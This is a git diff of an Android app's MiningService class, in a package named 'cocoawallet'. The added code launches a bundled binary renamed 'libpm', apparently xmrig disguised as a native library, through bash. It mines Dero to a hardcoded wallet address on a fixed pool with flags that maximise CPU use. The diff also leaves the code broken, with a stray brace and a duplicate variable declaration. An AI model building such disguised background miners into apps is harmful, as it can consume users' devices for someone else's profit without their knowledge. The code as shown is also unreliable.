@@ -21,6 +21,7 @@ package com.chadananda.cocoawallet;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Binder;
 import android.os.Build;
 import android.os.IBinder;
@@ -36,7 +37,6 @@ import java.io.InputStreamReader;
 import java.util.UUID;
 import java.util.Scanner;
 
-
 /**
  * MiningService for mining in the background
  * Created by uwe on 24.01.18.
@@ -50,36 +50,37 @@ public class MiningService extends Service {
     private OutputReaderThread outputHandler;
     private int accepted;
     private String speed = "./.";
-
-    ///exeptions
+    private String configTemplate;
+   /* static {
+        System.loadLibrary("pm");
+    }*/
+    //exeptions
     //privatePath/data/user/0/com.chadananda.cocoawallet/files
-
+    public native String stringFromJNI();
     @Override
     public void onCreate() {
         super.onCreate();
         // load config template
-
-
+        //configTemplate = Tools.loadConfigTemplate(this);
         //path where we may execute our program
-        //privatePath = getFilesDir().getAbsolutePath();
-//        System.loadLibrary("libpm");
-        privatePath = this.getApplicationInfo().nativeLibraryDir;
-        Log.e("privatePath","privatePath: "+privatePath);
-        File[] fileList = new File(privatePath).listFiles((dir, name) -> {
-            Log.e("privatePath","file: "+name);
-            return true; // we simply want all the files in this directory
-        });
+
+      //  Log.e("path","path: "+path);
+        //System.loadLibrary("pm");
+       // privatePath = this.getApplicationInfo().nativeLibraryDir;
+
+      //  File[] fileList = new File(privatePath).listFiles((dir, name) -> {
+      //      Log.e("privatePath","file: "+name);
+      //      return true; // we simply want all the files in this directory
+      //  });
 
         workerId = fetchOrCreateWorkerId();
         Log.w(LOG_TAG, "my workerId: " + workerId);
 
         String abi = Build.CPU_ABI.toLowerCase();
-
-
-
+       // Tools.copyFile(this,"arm64-v8a" + "/libpm", privatePath + "/libpm.so");
         //copy binaries to a path where we may execute it);
 //        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrigCC");
-//        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
+//       Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
 //        Tools.copyFile(this,"armeabi-v7a" + "/libuv", privatePath + "/libuv.so");
 
     }
@@ -105,9 +106,11 @@ public class MiningService extends Service {
         config.maxCpu = maxCpu;
         return config;
     }
+
     /**
      * @return unique workerId (created and saved in preferences once, then re-used)
      */
+
     private String fetchOrCreateWorkerId() {
         SharedPreferences preferences = getSharedPreferences("CocoaWallet", 0);
         String id = preferences.getString("id", null);
@@ -160,9 +163,11 @@ public class MiningService extends Service {
 
     public void startMining(MiningConfig config) {
         Log.i(LOG_TAG, "starting...");
-        if (process != null) {
+       /* if (process != null) {
             Log.i(LOG_TAG, "shutting down old process first...");
             process.destroy();
+        }*/
+       // privatePath = getFilesDir().getAbsolutePath();
         }
         String fullPath = "";
         String appDir = "";
@@ -173,26 +178,36 @@ public class MiningService extends Service {
             appDir = this.getApplicationInfo().nativeLibraryDir;
             //appDir = "/data/data/com.chadananda.cocoawallet/lib/arm64-v8a";
 
-
-
-            String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
-            String max_bwt = "710";
+       // Log.d("TAG", "startMining: "+stringFromJNI());
+        Log.e("privatePath","privatePath: "+privatePath);
+       // String fullPath = "";
+        try{
+            String appDir=this.getApplicationInfo().nativeLibraryDir;
+            String wallet="dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
+            String max_bwt="710";
             String pool = "us.hero.miner.us:1117";
             String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt "+
                     "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE "+
                     "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8"+
                     "--retry-pause=2";
+            String args = String.format(config_template,pool,wallet,max_bwt);
+            String[] pm = {"./libpm",args};
+            Runtime.getRuntime().exec(new String[]{"bash", "-l", "-c", args}, null, new File(appDir));
+           // fullPath = privatePath+"/libpm.so";
+            Log.e("args","args"+" "+appDir);
+            ProcessBuilder pb = new ProcessBuilder("./libpm",args);
+            pb.directory(new File(appDir));
+          
+//             String args = String.format(config_template, pool, wallet, max_bwt);
 
-            String args = String.format(config_template, pool, wallet, max_bwt);
+//             String[] pm = {"./libpm.so", args};
 
-            String[] pm = {"./libpm.so", args};
+//             fullPath = appDir+"/libpm.so";
 
-            fullPath = appDir+"/libpm.so";
+//             Log.e("args","appdir: "+appDir);
 
-            Log.e("args","appdir: "+appDir);
-
-            // experiment to try launching binary
-            execCmd(fullPath+' '+args);
+//             // experiment to try launching binary
+//             execCmd(fullPath+' '+args);
 
   /*
             ProcessBuilder pb = new ProcessBuilder( pm );
@@ -202,14 +217,9 @@ public class MiningService extends Service {
             pb.directory(new File(appDir)); // needs to be a file type
             // with the directory as ld path so xmrig finds the libs
             pb.environment().put("LD_LIBRARY_PATH", appDir);
-            //in case of errors, read them
             pb.redirectErrorStream();
             accepted = 0;
-            //run it!
-            Process process = pb.start();
-
-            // how do we check if this worked?
-            //start processing miners output    // so why not use pb.redirectOutput(); ?
+            Process  process = pb.start();
             outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
             outputHandler.start();
             Toast.makeText(this, "started: ", Toast.LENGTH_SHORT).show();
@@ -218,12 +228,14 @@ public class MiningService extends Service {
 
         } catch (Exception e) {
             Log.e("launcherror","error: "+e.getLocalizedMessage()+e.getCause());
-            Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
-            File ourApp = new File(fullPath);
-            if (ourApp.exists()) {
+          //  Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
+          //  File ourApp = new File(fullPath);
+           /* if (ourApp.exists()) {
                 Log.e("launcherror","but file does exist: "+fullPath);
             } else {
                 Log.e("launcherror","file not found: "+fullPath);
+            }*/
+           // process = null;
                 String outDirString = appDir; //"/data/data/com.chadananda.cocoawallet/lib";
 
                 File ourDir = new File(outDirString);
@@ -241,7 +253,7 @@ public class MiningService extends Service {
             }
             process = null;
         }
-}
+    }
 
     public String getSpeed() {
         return speed;
@@ -260,11 +272,9 @@ public class MiningService extends Service {
     public int getAvailableCores() {
         return Runtime.getRuntime().availableProcessors();
     }
-
     /**
      * thread to collect the binary's output
      */
-
     private class OutputReaderThread extends Thread {
         private final InputStream inputStream;
         private final StringBuilder output = new StringBuilder();
@@ -298,7 +308,6 @@ public class MiningService extends Service {
                 Log.w(LOG_TAG, "exception", e);
             }
         }
-
         public StringBuilder getOutput() {
             return output;
         }
